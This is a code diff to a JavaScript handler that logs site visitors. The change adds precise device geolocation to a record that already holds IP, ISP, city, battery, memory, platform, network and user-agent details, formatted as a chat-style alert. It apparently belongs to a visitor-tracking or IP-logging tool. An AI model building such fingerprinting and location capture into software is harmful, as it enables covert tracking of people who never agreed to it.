@@ -117,13 +117,27 @@ async function handleLogVisitor(request, env) {
     const urlParams = new URL(request.url).searchParams;
     const resolution = bodyData.resolution || urlParams.get("resolution") || "Unknown";
     const battery = bodyData.battery || urlParams.get("battery") || "Unknown";
-    const locationDetails = bodyData.location || urlParams.get("location") || "Unknown";
     const deviceMemory = bodyData.deviceMemory || urlParams.get("deviceMemory") || "Unknown";
     const effectiveType = bodyData.effectiveType || urlParams.get("effectiveType") || "Unknown";
     const downlink = bodyData.downlink || urlParams.get("downlink") || "Unknown";
     const platform = bodyData.platform || urlParams.get("platform") || "Unknown";
     const hardwareConcurrency = bodyData.hardwareConcurrency || urlParams.get("hardwareConcurrency") || "Unknown";
     const userAgent = bodyData.userAgent || urlParams.get("userAgent") || "Unknown";
+    const geoAccuracy = bodyData.geoAccuracy || urlParams.get("geoAccuracy") || "Unknown";
+
+    // Prioritize client-side geolocation if available
+    let finalLatitude = latitude;
+    let finalLongitude = longitude;
+    let locationDetails = "IP-Based Location";
+
+    if (bodyData.geoLatitude !== null && bodyData.geoLatitude !== undefined) {
+        finalLatitude = bodyData.geoLatitude;
+        locationDetails = "Device Geolocation";
+    }
+    if (bodyData.geoLongitude !== null && bodyData.geoLongitude !== undefined) {
+        finalLongitude = bodyData.geoLongitude;
+        locationDetails = "Device Geolocation";
+    }
 
         const deviceModel = ua.match(/\(([^)]+)\)/)?.[1] || "Unknown";
         const browser = ua.match(/(firefox|msie|chrome|safari|trident)/i)?.[0] || "Unknown";
@@ -158,7 +172,7 @@ async function handleLogVisitor(request, env) {
             `🌍 *Country*: ${country}`,
             `🏙 *City*: ${city}, ${region}`,
             `📌 *IP*: ${ip}`,
-            `📍 *Location*: [${latitude}, ${longitude}] (${locationDetails})`,
+            `📍 *Location*: [${finalLatitude}, ${finalLongitude}] (${locationDetails})`,
             `⏳ *Time Zone*: ${timezone}`,
             `📱 *Device Model*: ${deviceModel !== "Unknown" ? deviceModel : "N/A"}`,
             `💾 *Device Memory*: ${deviceMemory !== "Unknown" ? `${deviceMemory} GB` : "N/A"}`,
@@ -223,10 +237,12 @@ async function handleLogVisitor(request, env) {
                 region: region,
                 timezone: timezone,
                 isp: isp,
-                latitude: latitude,
-                longitude: longitude,
+                latitude: finalLatitude,
+                longitude: finalLongitude,
                 ip: ip,
-                timestamp: timestamp
+                timestamp: timestamp,
+                geoAccuracy: geoAccuracy,
+                locationType: locationDetails
             }
         }), {
             status: 200,
